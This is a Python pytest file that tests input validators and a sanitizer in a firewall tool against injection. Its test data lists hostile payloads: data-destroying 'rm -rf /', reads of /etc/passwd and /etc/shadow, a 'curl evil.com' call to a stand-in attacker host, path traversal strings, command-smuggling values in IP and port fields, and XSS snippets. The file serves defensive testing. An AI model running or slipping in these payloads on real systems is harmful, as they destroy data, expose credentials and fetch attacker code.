# ==============================================================================
# File:         tests/security/test_injection.py
# Synopsis:     Security tests for input injection attack prevention
# Version:      1.2.1
# ==============================================================================

import pytest
from apotropaios.core.errors import ValidationError, SanitizationError
from apotropaios.core.validation import (
    sanitize_input, validate_chain, validate_description, validate_file_path,
    validate_hostname, validate_interface, validate_ip, validate_ipset_name,
    validate_port, validate_table, validate_zone,
)


class TestShellInjection:
    """Verify shell metacharacters are rejected across all validators."""

    SHELL_PAYLOADS = [
        "$(whoami)",
        "`id`",
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl evil.com",
        "test\ninjected",
        "test\x00null",
        "$(cat /etc/shadow)",
        "${IFS}cat${IFS}/etc/passwd",
    ]

    def test_sanitize_strips_metacharacters(self) -> None:
        for payload in self.SHELL_PAYLOADS:
            result = sanitize_input(payload)
            for dangerous in (";", "|", "&", "`", "$", "\n", "\x00"):
                assert dangerous not in result, f"Dangerous char in: {result}"

    def test_ip_rejects_injection(self) -> None:
        for payload in ["192.168.1.1; rm -rf", "10.0.0.1|id", "1.1.1.1`cat`"]:
            with pytest.raises(ValidationError):
                validate_ip(payload)

    def test_port_rejects_injection(self) -> None:
        for payload in ["80; rm", "443|id", "8080$(whoami)"]:
            with pytest.raises(ValidationError):
                validate_port(payload)

    def test_chain_rejects_injection(self) -> None:
        for payload in ["INPUT; DROP", "OUTPUT`id`"]:
            with pytest.raises(ValidationError):
                validate_chain(payload)

    def test_table_rejects_injection(self) -> None:
        for payload in ["filter; rm", "nat|id"]:
            with pytest.raises(ValidationError):
                validate_table(payload)

    def test_zone_rejects_injection(self) -> None:
        for payload in ["public; rm", "trusted`id`"]:
            with pytest.raises(ValidationError):
                validate_zone(payload)

    def test_interface_rejects_injection(self) -> None:
        for payload in ["eth0; id", "wlan0$(whoami)"]:
            with pytest.raises(ValidationError):
                validate_interface(payload)

    def test_ipset_name_rejects_injection(self) -> None:
        for payload in ["blocklist;rm", "test`id`"]:
            with pytest.raises(ValidationError):
                validate_ipset_name(payload)


class TestPathTraversal:
    """Verify path traversal attacks are prevented."""

    TRAVERSAL_PAYLOADS = [
        "/etc/../etc/shadow",
        "../../../../etc/passwd",
        "/tmp/test/../../../etc/shadow",
        "/var/log/../../etc/shadow",
    ]

    def test_file_path_rejects_traversal(self) -> None:
        for payload in self.TRAVERSAL_PAYLOADS:
            with pytest.raises(ValidationError, match="traversal"):
                validate_file_path(payload)

    def test_null_byte_injection(self) -> None:
        with pytest.raises(ValidationError, match="null"):
            validate_file_path("/etc/config\x00.evil")


class TestXSSPrevention:
    """Verify HTML/script injection is stripped by sanitizer."""

    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        '<img src=x onerror="alert(1)">',
        "test<iframe>evil</iframe>",
        "hello <b onmouseover=alert(1)>world</b>",
    ]

    def test_sanitizer_strips_html(self) -> None:
        for payload in self.XSS_PAYLOADS:
            result = sanitize_input(payload)
            assert "<" not in result
            assert ">" not in result
            assert "script" not in result.lower() or "<" not in result


class TestDescriptionInjection:
    def test_rejects_metacharacters(self) -> None:
        for dangerous in [";", "|", "&", "`", "$("]:
            with pytest.raises(ValidationError):
                validate_description(f"Normal text {dangerous} more text")

    def test_accepts_safe_descriptions(self) -> None:
        safe = ["Block SSH traffic", "Allow HTTPS port 443", "Test rule number 1"]
        for desc in safe:
            assert validate_description(desc) == desc


class TestHostnameInjection:
    def test_rejects_shell_metacharacters(self) -> None:
        for payload in ["host;rm", "test`id`", "host$(pwd)"]:
            with pytest.raises(ValidationError):
                validate_hostname(payload)

    def test_accepts_valid_hostnames(self) -> None:
        for host in ["example.com", "sub.domain.co.uk", "localhost"]:
            assert validate_hostname(host) == host
